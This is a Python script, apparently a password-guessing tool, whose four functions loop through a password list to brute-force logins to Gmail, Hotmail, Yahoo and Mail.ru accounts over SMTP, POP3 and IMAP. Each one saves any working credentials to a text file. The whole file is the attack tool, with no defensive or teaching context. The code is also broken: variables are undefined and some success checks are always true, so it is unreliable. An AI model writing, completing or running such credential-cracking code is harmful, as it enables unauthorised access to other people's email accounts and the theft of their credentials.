import poplib, imaplib, smtplib, time, sys 
from imaplib import IMAP4
from poplib import POP3
import queue

base = queue.Queue()

def gmail(base):
	fn = open (base, "r")
	counting = fn.readlines()
	smtp_host = 'smtp.gmail.com'
	smtp_port = 465
	session = smtplib.SMTP_SSL()
	session.connect(smtp_host, smtp_port)
	#session.ehlo()
	#session.starttls()
	session.ehlo
	fn = open (passlist, 'r')
	for pass_file in fn:
		try:
			y_g= session.login(user, pass_file[:-1])
			if (y_g == (235, '2.7.0 Accepted')):
				session.quit()
				fn.close()
				fw = open('Gmail.txt','a')
				fw.write(user+': '+pass_file)
				fw.close()
		except smtplib.SMTPAuthenticationError:
			continue
			
def hotmail(base):
	fn = open (base, "r")
	counting = fn.readlines()
	host = 'pop3.live.com'
	port = 995
	server = poplib.POP3_SSL(host, port)
	fn = open (passlist, 'r')
	for pass_file in fn:
		pwd = pass_file[:-1]
		try:
			x = server.user(user)
			yy = server.pass_(pwd)
			if(yy == '+OK' or 'POP disabled'):
				server.quit()
				fn.close()
				fw = open('Hotmail.txt','a')
				fw.write(user+': '+pwd)
				fw.close()
		except poplib.error_proto:
			continue
			
def yahoo(base):
	fn = open (base, "r")
	counting = fn.readlines()
	host = 'imap.mail.yahoo.com'
	port = 993
	fn = open (passlist, 'r')
	for pass_file in fn:
		try:
			session = imaplib.IMAP4_SSL(host, port)
			y = session.login(user, pass_file[:-1])
			if (y == 'OK' or 'AUTHENTICATE completed'):
				session.logout()
				fn.close()
				fw = open('Yahoomail.txt','a')
				fw.write(user+': '+pass_file)
				fw.close()
		except IMAP4.error:
			continue
			
def mailru(base):	
	fn = open (base, "r")
	session = smtplib.SMTP_SSL('smtp.mail.ru', 465)
	session.ehlo
	for pass_file in fn:
		try:
			y_g= session.login(user, pass_file[:-1])
			if (y_g == (235, b'Authentication succeeded')):
				session.quit()
				fn.close()
				fw = open('mail.ru.txt','a')
				fw.write(user+': '+pass_file)
				fw.close()
		except smtplib.SMTPAuthenticationError:
			continue
